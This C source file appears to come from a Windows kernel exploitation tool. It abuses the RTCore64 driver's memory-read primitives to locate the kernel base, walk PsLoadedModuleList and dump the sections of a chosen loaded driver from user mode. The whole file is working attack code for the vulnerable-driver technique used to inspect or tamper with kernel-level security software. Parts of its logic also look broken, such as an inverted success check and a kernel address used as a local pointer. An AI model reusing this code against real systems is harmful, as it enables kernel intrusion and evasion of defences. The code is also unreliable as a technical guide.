#include <Windows.h>
#include <Psapi.h>

#include <stdio.h>

#include "utils.h"
#include "exploitRTCore64.h"
#include "helper.h"

#define BASE_DLL_NAME_BUFFER_LENGTH   256

DWORD64 OffsetPsLoadedModuleList;
DWORD64 PsLoadedModuleList;

BOOL getModuleName(DWORD64 moduleListEntry, char* moduleName) {
    UNICODE_STRING BaseDllName;
    BaseDllName.Buffer = (USHORT*)malloc(BASE_DLL_NAME_BUFFER_LENGTH);

    DWORD64 ptrBaseDllName = moduleListEntry + OFFSET_LDR_DATA_TABLE_ENTRY_BASE_DLL_NAME;
    RTCoreReadMemory(ptrBaseDllName, (BYTE *)&BaseDllName, sizeof(UNICODE_STRING));

    DWORD64 ptrBuffer;
    if (!RTCoreReadPTR(ptrBaseDllName + OFFSET_UNICODE_STRING_BUFFER, &ptrBuffer)) {
        return TRUE;
    }

    ULONG unicodeStringLength = BaseDllName.Length; // Length in wchar_t

    wchar_t* unicodeStringBuffer[50];
    if (!RTCoreReadMemory(ptrBuffer, (BYTE*)unicodeStringBuffer, unicodeStringLength)) {
        return TRUE;
    }

    // Allocate buffer in user space and read kernel memory
    size_t length = BaseDllName.Length / sizeof(wchar_t); // Length in wchar_t

    wchar_t* userBuffer = new wchar_t[length + 1];
    memcpy(userBuffer, unicodeStringBuffer, BaseDllName.Length);
    userBuffer[length] = L'\0'; // Null-terminate

    // Convert to narrow C string TODO put in utils
    wcstombs(moduleName, userBuffer, BaseDllName.Length);
    moduleName[length] = '\0';
    return FALSE;
}

BOOL readDataSection(const char* driverName) {
    DWORD64 moduleListEntry = PsLoadedModuleList;
    DWORD64 firstEntry = moduleListEntry;

    char moduleName[256];

    do {
        getModuleName(moduleListEntry, moduleName);
        // convert wide character string to UNICODE_STRING
        if (strstr(moduleName, driverName)) {
            printf("Found driver: %s\n", moduleName);

            // Read the driver base address (DllBase) and size (SizeOfImage)
            DWORD64 DllBase;
            if (!RTCoreReadPTR(moduleListEntry + OFFSET_DLLBASE, &DllBase)) {
                return TRUE;
            } //30 

            DWORD64 SizeOfImage;
            if (!RTCoreReadPTR(moduleListEntry + OFFSET_SIZEOFIMAGE, &SizeOfImage)) {
                return TRUE;
            } //40

            printf("DllBase address: 0x%llx\n", DllBase);
            printf("Driver size: 0x%llx\n", SizeOfImage);

            IMAGE_DOS_HEADER imageDosHeader;
            RTCoreReadMemory(DllBase, (BYTE*)&imageDosHeader, sizeof(imageDosHeader));

            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)DllBase + imageDosHeader.e_lfanew);

            USHORT number_of_sections;
            RTCoreReadMemory((DWORD64)ntHeaders + OFFSET_NUMBER_OF_SECTIONS, (BYTE*)&number_of_sections, sizeof(number_of_sections));

            DWORD64 ptrSectionHeaders = (DWORD64)ntHeaders + OFFSET_SECTION_HEADERS;

            // Locate the section headers
            IMAGE_SECTION_HEADER section;
            for (int i = 0; i < number_of_sections; i++) {
                RTCoreReadMemory(ptrSectionHeaders + (i * sizeof(IMAGE_SECTION_HEADER)), (BYTE*)&section, sizeof(IMAGE_SECTION_HEADER));
                char sectionName[9] = { 0 };
                memcpy(sectionName, section.Name, SECTION_NAME_LENGTH);
                if (memcmp(section.Name, "INIT", SECTION_NAME_LENGTH) == 0 ||
                    memcmp(section.Name, ".reloc", SECTION_NAME_LENGTH) == 0) continue;
                //  printf(".data section found! VirtualAddress: 0x%lx, Size: 0x%lx\n", section.VirtualAddress, section.SizeOfRawData);

                  // Now read the .data section
                DWORD64 data_section_address = DllBase + section.VirtualAddress;
                BYTE* data_section_contents = (BYTE*)malloc(section.SizeOfRawData);

                RTCoreReadMemory(data_section_address, data_section_contents, section.SizeOfRawData);

                // You now have the contents of the .data section
                printf("Read %s section of size: %lx bytes\n", sectionName, section.SizeOfRawData);
                displayMemoryDump(data_section_contents, section.SizeOfRawData);

                // Do something with data_section_contents...
                free(data_section_contents);
                //break;
            //}
            }

            break;
        }

        // Move to the next module in the list
        DWORD64 flink;
        if (!RTCoreReadPTR(moduleListEntry, &flink)) {
            return TRUE;
        }
        moduleListEntry = flink;
    } while (moduleListEntry != firstEntry); // Stop when we circle back to the first entry
    return FALSE;
}

// +
ULONG_PTR GetAddressKernelBase() // from userspace
{
    DWORD64 pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((DWORD64*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

// +
BOOL InitOffsetPsLoadedModuleList() // from userspace
{
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    DWORD64 pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) return TRUE;

    pPsInitialSystemProcess = (DWORD64)GetProcAddress(ntoskrnl, "PsLoadedModuleList");
    if (!pPsInitialSystemProcess) {
        FreeLibrary(ntoskrnl);
        return GetLastError();
    }
    OffsetPsLoadedModuleList = pPsInitialSystemProcess - (DWORD64)ntoskrnl;
    FreeLibrary(ntoskrnl);
    return 0;
}

BOOL InitPsLoadedModuleList() {
    DWORD64 addressKernelBase = GetAddressKernelBase();

    if (!addressKernelBase) return TRUE;

    if (!InitOffsetPsLoadedModuleList()) return TRUE;

    if (!RTCoreReadPTR(addressKernelBase + OffsetPsLoadedModuleList, &PsLoadedModuleList)) return TRUE;

    printf("PsLoadedModuleList is: 0x%llx", PsLoadedModuleList);
    return FALSE;
}